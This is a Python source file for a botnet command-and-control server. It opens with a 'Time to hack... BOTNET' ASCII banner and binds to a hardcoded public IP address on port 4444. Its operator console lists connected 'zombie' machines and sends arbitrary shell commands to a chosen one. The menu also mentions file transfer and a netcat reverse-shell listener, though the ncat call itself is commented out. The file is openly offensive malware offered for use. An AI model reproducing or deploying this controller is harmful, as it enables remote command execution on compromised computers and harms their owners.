import socket
import select
import threading
import os

mikuhacking = '''
         /^>》, -―‐‐＜＾}》
　　　 　/:≠´:::::;::::ヽ.
　　　 /::〃:::::／}:丿ハ    < Time to hack... >
　　　/:: i  ::／　ﾉ／ }:}
　　/:::: 瓜 イ ＞´ ＜ ,'ﾉ
　/:::::|ﾉﾍ.{､　 ヮ_.ノﾉイ
|::::::|  ／,}｀ｽ  /￣￣￣￣/
|::::::|  (_::::つ/ BOTNET/
     ￣￣￣￣￣＼/________/
                
'''
banner = f'''''
{mikuhacking}
ok
'''''
print(banner)



print("[*] Initializing....")
# Create a TCP/IP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific address and port
server_address = ('161.35.34.149', 4444)
server_socket.bind(server_address)

# Listen for incoming connections
server_socket.listen()

print(f"[*] Searching for botnets on {server_address[0]} port {server_address[1]}...")

# List of connected clients
connected_clients = []

def help():
    print('''
    == HELP ==

    | list : View actual online zombies
    | connect : Select one or multiple host to send a command using a shell
    | sgfile : Select a host to get or send a file (TCP)
    | reverse : open ncat reverse shell listener once reverse command have been send to a client
    ''')

def list():
    print("\n == ONLINE BOTNETS ==\n")
    for i, client_socket in enumerate(connected_clients):
        client_address = client_socket.getpeername()
        global client_list 
        client_list= f"{i}: {client_address[0]}:{client_address[1]}"
        print(f"{i}: {client_address[0]}:{client_address[1]}")

def connect():
    if connected_clients:
        try:
            print("\n == CONNECT == \n")
            print(client_list)

            client_number = int(input("\n Set client number : "))
            client_socket = connected_clients[client_number]
            command = input("--(command) > ")
            client_socket.send(command.encode())
            #if command != "reverse":
            #    client_socket.send(f"#LHA#{command}".encode()) # #LHA# is used to cut so that the client know what to exec and what it shouldn't
           # elif command == "reverse":
            #    client_socket.send("reverse".encode())
            
            
            #client_socket.send(command.encode())
            print("[*] Command send!")
        except (ValueError, IndexError):
            # Ignore any input errors and continue listening for connections
            pass

def terminalx():
    while True:
        terminal = str(input("server --> ")).lower()
        if terminal == "list":
            list()
        if terminal == "connect":
            connect()
        if terminal == "help":
            help()
        if terminal == "clear":
            os.system("clear")
            os.system("cls")
        if terminal == "banner":
            print(banner)
        if terminal == "reverse":
            print("[!] Client ready open a new terminal and run netcat!")

            #os.system("ncat -lvp 4448")
        

input_thread = threading.Thread(target=terminalx)
input_thread.daemon = True
input_thread.start()

while True:
    # Wait for at least one socket to be ready for processing
    read_sockets, _, _ = select.select([server_socket] + connected_clients, [], [])

    for socket_ready in read_sockets:
        # If a new connection request is received
        if socket_ready is server_socket:
            # Accept the connection
            client_socket, client_address = server_socket.accept()
            print(f"\n [INFO] NEW BOTNET : {client_address[0]}:{client_address[1]} \n")

            # Add the client to the list of connected clients
            connected_clients.append(client_socket)

        # If a message is received from a client
        else:
            message = socket_ready.recv(1024).decode()
            client_address = socket_ready.getpeername()
            print(f"Received message from {client_address[0]}:{client_address[1]} - {message}")
            
